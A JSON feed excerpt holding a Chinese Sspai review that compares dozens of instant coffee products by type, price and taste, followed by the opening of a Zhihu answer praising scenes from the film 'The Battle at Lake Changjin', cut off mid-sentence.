[{"title":"尝试了几十种速溶咖啡后，想和你聊聊移动咖啡馆","date":"2021-10-07 03:21:49","description":"\n<p>我离不开咖啡，是那种从肉体到精神层面的都离不开，每天早上用第一杯咖啡开启高效工作是做作的奉承，但每天早上嘬下的第一口拿铁是疲惫生活里最强的一针肾上腺素是我对咖啡最恰如其分的赞歌。</p>\n<p>一直以来我对咖啡的要求介于随性和苛刻之间，随性是指我不太纠结豆子的烘焙、产地甚至新鲜程度，我可以在电商购物节里在销量排名最高的店铺一次性买上十数包豆子扔柜子里慢慢喝，同样的研磨度和萃取时间因为新鲜度流失无论出来的咖啡液是标准的 36g 还是稀稀拉拉的 60g 我都能微笑又满足的一饮而尽；但我讨厌速溶咖啡，讨厌到尽管曾经只喝过雀巢三合一，朋友非要让我试试并给了我一颗三顿半我能在咖啡机旁摆一年也不愿意尝试一下被聊得热热闹闹的冻干到底是啥滋味。</p>\n<p>我能隐隐喝出精品咖啡店里手冲小卡片上的前中后味，但我依然更喜欢中深烘焙豆子流出的黝黑 shot，再配上蛋白质含量越高的牛奶对我来说就是越好喝的咖啡。</p>\n<p>所以当我说「我喜欢喝咖啡」的时候，并不代表我是一个精致的咖啡猎人，咖啡于我就是一种附赠感性愉悦的功能性饮料，只要它能让我虎躯一震，并且香醇入口，那么它就是一杯好咖啡——我想和我这样的普通咖啡成瘾者应该很多，所以这次作为一个尝试了数十种不同技术和口味的速溶新人，我想就像平日里喝咖啡那样，只要快乐和好喝，不谈虚头巴脑的这那那这，看看如果没有咖啡机，我们到底能不能喝上一杯好咖啡。</p>\n<h2>我都试了哪些咖啡</h2>\n<p>最早在了解现在主流热门的速溶咖啡时，看到很多人说「可不要拿雀巢那种垃圾速溶和我们冻干、挂耳比」，所以我也有那么一阵恍惚「速溶咖啡特指雀巢三合一」，但后面想了想，「速溶」的对立面应该是「讲究」——你要花钱买咖啡机、买磨豆机、要了解选配最好口味的豆子、要苛求研磨度、萃取时间和和压力、要打出细腻绵密的奶泡、还要能拉出独角兽。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/2f56e381a6aa2fb6cbbe3311e44b2ce7.jpg\"></figure><p>所以反推并强调——全文我所提及的速溶是只需要杯子和水（包含冷热水和冷热奶）就能做出来的咖啡，至于雀巢还是三顿半永璞明谦，它们都在同一个起跑线上，只是售价和加工技术的不同。</p>\n<p>我先列举一下在撰写本文前我都尝试过的咖啡：</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td><strong>品牌</strong></td>\n<td><strong>型号</strong></td>\n<td><strong>类别（储存条件）</strong></td>\n<td><strong>包装（数量*单件重量）</strong></td>\n<td><strong>单价（人民币）</strong></td>\n<td><strong>冲泡条件</strong></td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"3\">\n<p>明谦</p>\n<p> </p>\n</td>\n<td>嘿可可</td>\n<td>袋泡</td>\n<td>15*10g</td>\n<td>4</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>冰滴咖啡黄金曼特宁、耶加雪菲</td>\n<td>咖啡液（冷藏）</td>\n<td>10*30ml</td>\n<td>4.27</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>超精品即溶黄金曼特宁、耶加雪菲</td>\n<td>冻干</td>\n<td>10*2g</td>\n<td>4.45</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"6\">\n<p>科林</p>\n<p> </p>\n</td>\n<td>数字挂耳 5 号</td>\n<td>挂耳</td>\n<td>20*12g</td>\n<td>3.6</td>\n<td>热水</td>\n</tr>\n<tr>\n<td>硬盒超即溶混合装</td>\n<td>冻干</td>\n<td>12*3g</td>\n<td>7.42</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>热泡拿铁</td>\n<td>袋泡</td>\n<td>20*10g</td>\n<td>3.45</td>\n<td>热水</td>\n</tr>\n<tr>\n<td>冰酿奶萃</td>\n<td>袋泡</td>\n<td>20*10g</td>\n<td>3.45</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>速溶纯黑咖啡粉</td>\n<td>高温干燥咖啡粉</td>\n<td>227g</td>\n<td>0.32（按照官方冲泡要求 126 杯计算）</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>小萌蛋多彩装</td>\n<td>咖啡液（常温）</td>\n<td>12*18g</td>\n<td>4.92</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>\n<p>UCC</p>\n<p> </p>\n</td>\n<td>职人咖啡</td>\n<td>高温干燥咖啡粉</td>\n<td>90g</td>\n<td>1.31（按照官方冲泡要求 45 杯计算）</td>\n<td>热水</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"2\">瑞幸</td>\n<td>花漾特调</td>\n<td>冻干</td>\n<td>12*3g</td>\n<td>7.93</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>元气弹</td>\n<td>冻干</td>\n<td>18*2g</td>\n<td>5.5</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"2\">雀巢</td>\n<td>馆藏拿铁</td>\n<td>三合一</td>\n<td>20*19</td>\n<td>3.33</td>\n<td>热水</td>\n</tr>\n<tr>\n<td>金牌空气咖啡</td>\n<td>冻干</td>\n<td>50g</td>\n<td>2.36（按照官方冲泡要求 25 杯计算）</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>企鹅市集</td>\n<td>冷萃咖啡液</td>\n<td>咖啡液（冷藏）</td>\n<td>10*30ml</td>\n<td>6.9</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"4\">三顿半</td>\n<td>手冲滤挂式咖啡粉深度烘焙</td>\n<td>挂耳</td>\n<td>10*10g</td>\n<td>5.9</td>\n<td>热水</td>\n</tr>\n<tr>\n<td>冷萃滤泡咖啡拿铁拼配</td>\n<td>袋泡咖啡</td>\n<td>10*12g</td>\n<td>6.9</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>茶粉混合装</td>\n<td>冻干</td>\n<td>18*1g</td>\n<td>4.94</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>精品速溶冻干</td>\n<td>冻干</td>\n<td>18*2g</td>\n<td>4.94</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"5\">永璞</td>\n<td>闪萃即溶咖啡液黑咖啡、榛果咖啡、柚子咖啡</td>\n<td>咖啡液</td>\n<td>7*25g</td>\n<td>8.05</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>乌龙咖啡</td>\n<td>冻干</td>\n<td>12*2.2g</td>\n<td>8.25</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>冷萃咖啡液经典、埃塞俄比亚、云南石端正、云南紫叶云澜、云南皓月旷野</td>\n<td>咖啡液</td>\n<td>10*22ml</td>\n<td>4.58</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>冷萃飞碟冻干</td>\n<td>冻干</td>\n<td>12*2.8g</td>\n<td>8.25</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>闪萃茶液</td>\n<td>茶液</td>\n<td>7*25</td>\n<td>8.05</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>AGF</td>\n<td>MAXIM 黑咖啡</td>\n<td>高温干燥咖啡粉</td>\n<td>20*2g</td>\n<td>2.4</td>\n<td>热水</td>\n</tr>\n</tbody></table></figure><p>以上这些是我在咨询了一些常喝速溶咖啡的作者和朋友后下单的，另外我也对比了一下「速溶咖啡」、「冻干」和「咖啡液」等关键词下的销量排序，它们几乎也都是目前速溶咖啡界的「顶流」，所以我将从它们开始自己的速溶咖啡新世界。</p>\n<h2>速溶咖啡的技术与升级</h2>\n<p>想必很多人和我一样都是在小时候从雀巢知道咖啡，再从星巴克明白什么是咖啡与速溶咖啡，但其实速溶咖啡的历史远比我们想象中的久远。</p>\n<p>早在一百三十多年前新西兰人 David Strang 便发明并登记了咖啡粉的专利，而后经过数次改良最终由雀巢以喷雾干燥技术正式风靡世界并沿用至今。这种技术简单来说就是利用高温热气喷射咖啡萃取液使其水分蒸发，最后形成可溶于水的咖啡粉，但凡事有利有弊，相比正常手磨咖啡粉制作出来的咖啡，这种速溶咖啡粉在高温下已经失去了咖啡特有的芳香物质，你喝到的就成了一杯毫无生命力的苦水。</p>\n<p>但雀巢厉害的是想到了给咖啡「调味」，不仅在前期咖啡粉制作过程中添加可溶性碳水化合物增加咖啡香气，还「买一赠一」附上了声名远扬的「咖啡伴侣」，甚至之后直接奶精香精三合一的便携包。这一举动虽仍然被咖啡爱好者诟病「咖啡之耻」，但意外的是被许多之前接受不了咖啡苦涩味的路人所喜爱，成了一杯好喝又提神的「快乐水」。</p>\n<p>在确定这个选题之前以上便是我对速溶咖啡的所有认知，而因为这种工业化生产的速溶咖啡通常使用品质低劣的咖啡豆，同时我又非常喜欢咖啡中独特醇厚的酸苦滋味，所以可想而知我一直以来有多么嫌弃速溶咖啡。</p>\n<p>但现代新技术下的速溶咖啡着实让我再一次重新认识了速溶咖啡。</p>\n<h3>冻干速溶</h3>\n<p>「冻干咖啡」应该是目前口味最丰富也最受欢迎的速溶咖啡品类了，从技术上来讲，我认为它当算是对传统高温速溶法的一种升级。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ahhe5b34teh0gc1cag.jpeg\"><figcaption>永璞冻干工艺宣传图</figcaption></figure><p>我们知道水有三种形态——液体、固体和气体，在不同的温度和压力下它们之间能够互相转换，传统的速溶工艺是通过高温让咖啡萃取液中的水分蒸发，而冻干咖啡同样运用了水的升华特性，不同的是它是在真空低温的环境下使其升华留下易溶于水的咖啡粉。相比高温升华，冻干技术能更好的保留住咖啡原本的香气，最后也就不再只是喝下一杯「苦水」，而是尽可能还原其本质的咖啡。</p>\n<p>可冻干工艺说起来简单，它背后需要付诸的是高温工艺远不能比的生产（机器）成本，同时因为可以最大程度还原咖啡本身的香气，所以冻干技术原则上就需要使用更高品质的咖啡豆。最后得到的结果是前文表格中最高近 ¥8/杯的科林超即溶，它已经超过了我日常搭配咖啡机使用咖啡豆的成本，但成品肯定不能相提并论。</p>\n<p>不过这种说法并不准确，咖啡机本身的价值和耗时都是一杯咖啡的成本，而冻干只需要一个杯子和任意温度液体就可以出品的特性也是它价值的一部分。回过头来看我总是若有似无的强调价值或许是因为「速溶咖啡就等于劣质廉价咖啡」的刻板印象，但我想这个观念或许应该稍以改变。</p>\n<h3>速溶咖啡液</h3>\n<p>其实尝试之前我对速溶咖啡液的期待是最大的，因为无论高温低温升华获取速溶咖啡粉都会有芬芳物质流失，那如果是直接咖啡液封装应该就能获得最本味的还原了；对于冻干我更多是「可能就好一点点」的平平期待。</p>\n<p>可实际体验后的结果是我应该不会再继续购买咖啡液了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ahhedb34teit0pmp8g.jpeg\"><figcaption>永璞咖啡液制取流程</figcaption></figure><p>目前市售的咖啡液大多数为高温煮制和低温冷萃，简单来说就是我们在咖啡店里买到的浓缩版美式或冷萃咖啡，也有少部分例如科林的「小萌蛋」是用 129℃ 纯净水经 0.05s 的 500Kpa 高压萃取获得，再极速冷却、杀菌并封装。从口感上来讲低温冷萃的咖啡液更注重咖啡豆的风味还原，所以你能喝到它所标识的诸如坚果、柑橘和莓果等不同风味；而高温煮制的咖啡液苦感更浓，更像是一杯传统认知里的咖啡。</p>\n<p>但它们都有一个我认为致命的缺点，就是太淡——当然这是一个极其主观的评价，我一向喜欢咖啡特有的苦涩风味，印象中在东南亚喝过的特有的带烟熏味的咖啡是我感官愉悦的巅峰，我几乎不会主动去尝试精品咖啡店里的各种特色手冲，因为很难静下心来去品尝那些细微的复合滋味，就喜欢浓郁厚重醇香热烈的的苦涩咖啡。</p>\n<p>所以如果你平日里喜欢美式或者寻觅各种精品手冲，那么可能咖啡液更适合你；反之如果你和我这般永远的拿铁、Dirty 和馥芮白，那么或许冻干更适合你。值得一提的事，在此我仅讨论的是口味，但我个人的感受是咖啡液的咖啡因含量是略高于冻干咖啡的。</p>\n<p>值得一提的是目前市售的咖啡液通常分为冷藏和常温保存两种方式，并且前者保质期相对较短（通常在三个月左右），后者甚至能超过一年。从工艺上来讲，需冷藏保存的咖啡液通常是萃取后直接冷却封装，常温长期保存的则是在萃取后经过了高温杀菌再封装。从口味上来讲，前者保留了更多咖啡风味，更适合用来制作冰美式或者苏打水、鸡尾酒特调等需要体会咖啡复合风味的饮品，后者则有着更浓郁的苦涩滋味（非贬义），甚至还有大部分直接调配好的榛果、柚子等口味拿铁，可以直接淋入牛奶饮用，所以如果你和我这般大部分时候都是奶咖为主，那么选择常温保存的咖啡液即可。</p>\n<h3>挂耳与袋泡咖啡</h3>\n<p>在冻干和咖啡液风靡之前，挂耳咖啡应该是速溶咖啡界鄙视链的顶端，代表着即使是不方便喝新鲜咖啡但也绝不将就的骄傲。</p>\n<p>从某种程度来讲，挂耳咖啡其实就是精品店里手冲咖啡的另一种形态，如果你能掌握好水温和冲泡手艺，依然能得到一杯毫不逊色的精品咖啡，区别只在于店里通常是现磨咖啡豆冲泡，拥有完整的咖啡风味，而研磨后包装出售的挂耳咖啡总归是不断在流失新鲜度。所以如果你是手冲爱好者并且对挂耳咖啡感兴趣，非常推荐尝试，并且建议少量多次购买，尽可能都品尝最新鲜封装的挂耳咖啡。如果想要了解更多挂耳咖啡的知识，<a href=\"https://sspai.com/post/65645\" target=\"_blank\">非常推荐阅读这篇文章。</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/f74b4a7a658c7db1ddaae7734fa54c00.jpg\"></figure><p>现在我想重点讲讲袋泡咖啡。其实在挂耳咖啡风靡之时，我就想着为什么没有类似于茶包那样的袋泡咖啡，方便快捷，没想到真的在这次筹备内容的时候喜闻乐见了许多袋泡咖啡产品。</p>\n<p>其实袋泡咖啡本质上和挂耳咖啡类似，都是用滤袋封装新鲜研磨的咖啡粉出售，所以在购买时依然建议遵循「少量多次」的购买思路，不要迷信它的保质期，尽可能买最新鲜日期的产品并尽快饮用。另外我们有必要知道一个咖啡的特性，就是咖啡粉可溶于水的风味物质不全都是我们喜欢的，如果是热水浸泡的话最好在 5min 左右浸泡后立马丢弃，切不可像茶叶那般长时间甚至反复热泡，这样你真的会收获一杯刷锅水。</p>\n<p>袋泡咖啡是我在尝试了这几种形态的速溶咖啡后最意外的一种，用它做出来的冰拿铁非常入味丝滑，唯一美中不足的就是需要提前放在冰箱里冷藏八小时略嫌麻烦，但是是值得的。</p>\n<h2>那些值得买的速溶咖啡</h2>\n<p>说了这么多，主要是想要让大家对不同种类的速溶咖啡有个了解，不同生产技术封装的速溶咖啡不仅呈现的风味不同，也和你日常的咖啡选择有关，简单总结来说：</p>\n<ol>\n<li>如果你喜欢美式这样的纯咖啡，推荐速溶咖啡液，并且最好是冷藏保存的冷萃咖啡液，你可以放心跟着包装上标识的风味选购，最后成品几乎一致；</li>\n<li>如果你喜欢冰奶咖，并且时间充裕，可以选择袋泡咖啡，但需要注意冷藏时间最好控制在不多不少八小时，少了风味析出不足，多了可能就会变成刷锅水；</li>\n<li>冻干咖啡是一个不会出错的选择，无论是冷热冲泡美式或者奶咖，都能获得不错的体验，并且调制方便，值得一提的是现在大部分冻干咖啡粉都会标识适合美式或者奶咖，可以参照这个购买；</li>\n<li>挂耳咖啡见仁见智，它是「精品手冲爱好者不可抗力条件下的解决方案」，同时如果想要获得一杯好喝的挂耳还需要一定程度的冲泡技巧，不建议新手直接冲；</li>\n<li>永远不要买雀巢。</li>\n</ol>\n<p>而我作为冰奶咖爱好者，给你推荐几款一定要尝试的速溶咖啡。</p>\n<h3>明谦「超精品即溶咖啡#黄金曼特宁」，风味被还原得丰富又浓郁</h3>\n<p>冻干咖啡有一个致命的缺点就是它在干燥过程中总是会有风味流失，但明谦的这款「超精品即溶咖啡」却非常完美的还原了咖啡的复合风味。按照官方的描述，「采用了 A-R 香气还原技术，在咖啡还呈现液体时将香气统一收集，在冻干后再进行重置还原」，我反复搜索了相关信息也没有找到更详细的介绍，如果有了解的朋友也非常感激补充。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/6f95c7cf282c1db4a47ee87a8163d6eb.jpg\"></figure><p>从口味上来讲，它的确能尝到官方标识的「黑巧风味」，但如果只是这样就没啥可说的了，非常惊人的是它还能尝到一种很浓郁的醇厚香气，这种香气不是一种具体的味道例如常见的坚果莓果蜂蜜等，它就是咖啡本身的香气。怎么说呢，就像用猪油炒的蒜蓉菜心、大铁锅做出来的炖肉和满山跑老母鸡熬出来的鸡高汤，就像我们常说速溶咖啡是没有灵魂的，而这股香气给速溶咖啡带来了灵魂。</p>\n<p>这款咖啡有两种口味，分别是「黄金曼特宁」和「耶加雪菲」，前者适合奶咖后者更宜黑咖，如果你想要尝试冻干，它必须第一个被下单。</p>\n<h3>明谦「袋泡咖啡#嘿可可」，牛奶咖啡相亲相爱一家人</h3>\n<p>作为一个奶咖爱好者，如果是冰饮相比冰拿铁我更喜欢 Dirty，因为我默认咖啡与牛奶是没有那么容易融合在一起的。大多数时候喝冰拿铁都是从淡到淡，越喝越淡，所以还不如像 Dirty 那般直接大口咖啡包裹着冰润奶香三十秒一饮而尽。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/b89c2a094158c42f5771ad61047ef923.jpg\"></figure><p>但这款袋泡咖啡是真的让我第一次强烈体会到「冰奶咖」的魅力，经过八小时的冷泡奶香与咖啡香非常巧妙地融合在了一起，从第一口到最后一口都是同样的快乐，而且入口丝滑。对比同时购买的其它几款袋泡，他们要么就是析出的咖啡香气不足，要么就是过萃（按照官方建议时间）析出了很多糟糕风味虽不至于刷锅水但的确不是讨喜的成品。</p>\n<p>其实我花了不少时间纠结它和前一款冻干的推荐顺序，因为从口味来讲我更喜欢这款袋泡咖啡，最后想想八小时的冷萃条件似乎已经超出了「速溶咖啡」的特点——你不能随时随地想喝就喝。但相反的，即便你和我一样有完善的新鲜咖啡萃取条件，我也非常建议你购买尝试，在某个决心就待屋里啥也不干的周末提前准备好，给宅家的快乐加倍。</p>\n<h3>永璞「6.0 冷萃咖啡液#红色石端正庄园」</h3>\n<p>原则上我是不太喜欢咖啡液的，因为它的风味太丰富了。如果是冷萃咖啡液，在咖啡本身的风味之余会尝到一些奇奇怪怪的酸涩感，虽然可以理解为速溶咖啡的缺陷，但若是没有这个借口，放在新鲜咖啡上那完全就是一杯变质了的坏咖啡；而经过高温灭菌封装后可以常温冷藏的咖啡液虽然大部分烦杂风味被浓烈的咖啡苦涩隐藏，但与之相伴的是一种淡淡的橡胶味儿。总之在我购买的这些款咖啡液里，没有一款是让我满意想着以后再来一次的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/19159c615a988afd3a30c0f957db2e33.jpg\"></figure><p>但我也能理解读着此文的你是满脑袋不信的，所以我从中挑选了三款稍微那么适口的咖啡液分享给你，分别是来自永璞的「6.0 冷萃咖啡液#红色石端正庄园」、明谦的「冰滴咖啡液#黄金曼特宁」和企鹅的「冰滴鲜萃黑咖啡#中烘焙」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/e5a94f425acc1dd25440bbdd221d0161.jpg\"></figure><p>其中我建议一定要尝试的是永璞的「6.0 冷萃咖啡液#红色石端正庄园」，这款咖啡液非常适合做奶咖，其实我建议任何咖啡液都一定尝试奶咖，不要指望它能还原出一杯新鲜的美式，你得到的将会只是一言难尽的大杂烩。</p>\n<p>这款咖啡液使用的是云南保山咖啡豆，有明显的坚果和巧克力风味，异味感也较弱。</p>\n<h3>不建议把特调咖啡当口粮，但可以尝个鲜</h3>\n<p>无论冻干还是咖啡液，它们在萃取、回收和封装保存的过程中总会对咖啡原有的风味产生负面影响，可就像不新鲜的食材可以用重油重盐烹饪来弥补，这些遗憾也可以用所谓的「花式特调」来补全。但我不认为它们可以被作为解决方案，首先我对一切添加剂持保留态度，其次当我们想要来一杯花式特调的时候通常是想要喝一杯「好喝的含咖啡因饮料」，而它们只是对速溶咖啡的缺点稍加隐瞒，是远远达不到「好喝」程度的，所以我建议你不要抱太大希望试图将其作为「哪怕缺少条件也能拥有的一杯好喝饮料」。</p>\n<p>其次，就我个人体验上来讲，花式特调的速溶明显咖啡因含量不足，你几乎要两份的量才能拥有一杯足量的生命水，除非你只想喝这种带咖啡味儿的香精饮料，不然还是建议想要解馋的时候叫杯二十块不到的瑞幸满意度都会更高。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/ada140bb04e319b7dd7d6d28d4b860ac.jpg\"></figure><p>但尝鲜还是可以的，我推荐的是永璞的蜜桃乌龙冻干，首先本来乌龙茶香与咖啡就是比较契合的一个味道，两者相辅相成不会冲突，然后有一股微弱的蜜桃香气飘浮在里面。相比「特调」这种略显复杂的描述，我更喜欢称之为趣味，让普通又苦涩的咖啡多了一些乐趣和层次，非常适合某个烦闷的午后用来轻松一刻。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/73f36a27f8b8f1bf97d609aad7721d97.jpg\"><figcaption>瑞幸的花式特调你都不知道被调的是风味还是咖啡</figcaption></figure><p>其实从某种程度上来讲，我觉得雀巢那种香精三合一应该算是最古早的特调，而我这次购买的瑞幸花漾特调有一个与之相同的特点，就是「放肆」。前面之所以推荐永璞是因为它很克制蜜桃乌龙风味与咖啡本味之间的比例，淡化前者成为后者延绵过程中的点缀。但瑞幸的这些莫名其妙的什么菠萝、玫瑰、蔓越莓等风味几乎是和咖啡本味混杂在一起的，你不能说它难喝，但它已经不像是咖啡了。</p>\n<p>有趣的是在这次挑选测品的时候我无意间的决定让我发掘出了日后家中常备的饮料，它们分别是永璞的宇治抹茶液和三顿半的茶粉（我买的是混合装，每一种口味都很棒）。我一直觉得东方的茶和西方的咖啡都是大自然的瑰宝，可能是因为咖啡因的提神效果，也有可能是因为自己年纪大了，不过相比咖啡，我对茶更挑剔一些——喜苦不喜涩，所以通常我都更喜欢类似于乌龙、普洱这一类的茶以及宇宙之光抹茶。</p>\n<p>永璞的抹茶非常的浓郁，不是那种加了工业香精的浓郁，而是抹茶本有的醇厚，而且因为已经是液体的缘故，可以直接与冰牛奶搅和做出一杯非常好喝的冰无糖抹茶拿铁，其实你如果喜欢抹茶，就应该知道无糖类的抹茶饮料要想好喝对抹茶的品质要求是非常严苛的。</p>\n<p>至于三顿半的茶粉也是如此，它们同样用了和冻干咖啡一样的萃取、干燥和封装工艺，所以你可以得到一杯非常浓郁醇厚且本味的茶汤，而且它们易溶性非常好，很适合用来做茶拿铁。如果你不是非常想要尝试特调咖啡又想要喝上好喝的相对健康饮料，这两款速溶茶饮非常推荐你尝试。甚至作为一个坚定的新鲜萃取咖啡爱好者，我觉得速溶茶才应该是速溶饮料的归途——而速溶咖啡只能是不得已的解决方案。</p>\n<h2>最后</h2>\n<p>这篇文章立意明确——速溶咖啡评测，但在撰写过程中我花了很长时间思考它的形式。最开始我是想要写一篇理中客的速溶咖啡评测，结果发现根本做不到，首先我想要推荐的都不是销量这个客观数据最高的，其次当我邀请不同的朋友来尝试这些咖啡的时候，包括我在内每个人的喜好都是不尽相同的。所以我就放弃了，也放飞了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/10d364d9429f5e9790f69cc60db4a4ec.jpg\"><figcaption>它们真的就只是咖啡因</figcaption></figure><p>我没有逐一介绍，也未曾像网上大部分类似的文章一样预设评测标准然后打分排序，站明一个「奶咖爱好者」的立场后，我只推荐了我最喜欢的几款。至于还有几款甚至都没有提到的例如雀巢的「馆藏拿铁」和经常看到的「职人咖啡」，我只能说咖啡这玩意儿在大部分时候都是一分钱一分货了，当冻干敢卖到近三块钱一克的时候，你就想也别想那些一块乃至几毛钱的产品了，没有智商税，也没有尚未被挖掘的宝藏。</p>\n<p>最后再回到「移动咖啡馆」这个话题，我不知道你会不会觉得，咖啡是一种带情绪的饮料，就是你回想一下你每天的第一杯咖啡——可能是如都市丽人那般端着纸杯穿行在街头，可能是工位落座后第一口「鸡血」，也有可能像我这样「一天的开始」，当你习惯了咖啡后，你一定也会有固定喝咖啡的场景和时间，最后它就会变成一场私密的仪式、状态切换的旋钮和「只要我觉得」的快乐。</p>\n<p>所以移动咖啡馆的核心不在于「如何移动」，而是「咖啡常相伴」。我们总是需要一些一定要做但又意义泛泛的事儿，哪怕只是喝一杯咖啡，我希望无论是几毛钱的香精速溶还是数十更甚的精品鲜萃，保留这个习惯，并抓住一切机会去持续它。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69062"},{"title":"电影《长津湖》中的哪些细节最让你印象深刻？","date":"2021-10-07 02:42:51","description":"\n<p></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f84e97e3df75dad54a330a2f0a3ec2d0_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"632\" data-rawheight=\"350\" data-watermark=\"watermark\" data-original-src=\"v2-f84e97e3df75dad54a330a2f0a3ec2d0\" data-watermark-src=\"v2-6346f6c021c74d1cc386bef0781636ed\" data-private-watermark-src=\"v2-8cb7ef8a32c2be32722c5539a9b45da4\"></p>\n<p>「疼……疼死我了……别……别把我……别把我一个人留在这儿……」</p>\n<p>火光映天，炸弹轰鸣，「人人那个都说哎，沂蒙山好啊」，《沂蒙山小调》响起，整个世界都仿佛安静了下来。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cdf79ea1310c6871a9d3ddb10508c2bd_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"458\" data-rawheight=\"212\" data-watermark=\"watermark\" data-original-src=\"v2-cdf79ea1310c6871a9d3ddb10508c2bd\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>七连的第17名兵、经历那么多生死战役的老排长——雷公永远倒下了……牺牲前，他唯一的愿望就是不想一个人留在异国他乡。</p>\n<p>昨天，走进电影院观看《长津湖》，看到这里，我再也绷不住了，彻底破防，泪水决堤。</p>\n<p>作为军人，雷公（胡军 饰）冒着枪林弹雨、驾驶车辆运送标识弹冲进敌营，浑身已被战火烧得面目全非，却全然不顾疼痛。然而，牺牲前，他回归了自己，感受到了身体上的疼痛，想回家了。雷公的愿望何尝不是那些留在异国他乡的志愿军英雄的遗愿呢？</p>\n<p>雷公，七连现役中最老的同志、元老人物，在枪林弹雨中与七连一起成长，教出了伍百里、伍千里等连队的一代代骨干，外表严厉、内心炽热的山东大汉，真实、豪爽、耿直、憨厚、温暖的老班长、老兵的样子。</p>\n<p>看到他，也许很多人都会想起自己的老班长。</p>\n<p>这正是影片《长津湖》的可贵之处：<b>塑造的英雄真实、接地气。英雄绝不是从天而降，他们都经历了磨砺、经历了考验，先是一个个活生生的人，然后才是成长、英勇、升华。</b></p>\n<p>这就是真实的中国军人的样子、英雄的样子！不是高高在上、高不可攀，而是这样的简单纯粹，扛起崇高的使命：保家卫国！为了保卫母亲和孩子，为了打败杀我同胞、侵我边境的美帝野心狼。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5dcfd8ec4dfcafce48de9dea1f820889_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-5dcfd8ec4dfcafce48de9dea1f820889\" data-watermark-src=\"v2-6687aa792e71020c57a32166dfd55701\" data-private-watermark-src=\"v2-a5a85e1e62eb767162c75b2e17d24162\"></p>\n<p>——因为懂得这个崇高的使命，所以，伍千里（吴京 饰）在接到归队命令后，毫不犹豫打起背包就出发。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e00ffd9bdb3d627d1d49475f4d5eab3c_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"645\" data-rawheight=\"339\" data-watermark=\"watermark\" data-original-src=\"v2-e00ffd9bdb3d627d1d49475f4d5eab3c\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>本打算给父母盖个房子，摆脱世世代代在渔船上漂泊的孤苦生活，再给十年没见的三弟伍万里说个媳妇，一家人安安稳稳地过日子。但现在，有人想破坏这份安稳的生活，有人想夺去这份来之不易的和平。祖国的号召，战士们打起背包奔赴战场，保家卫国，义不容辞。</p>\n<p>若有战，召必回！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8f4838c10af6b048ac199e89d9d14c1c_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-8f4838c10af6b048ac199e89d9d14c1c\" data-watermark-src=\"v2-d65c3132ca0d8c2c36402940d6f02dd9\" data-private-watermark-src=\"v2-ca9894e60122152a2f66e607aaa1b343\"></p>\n<p>——因为懂得这个崇高的使命，指导员梅生（朱亚文 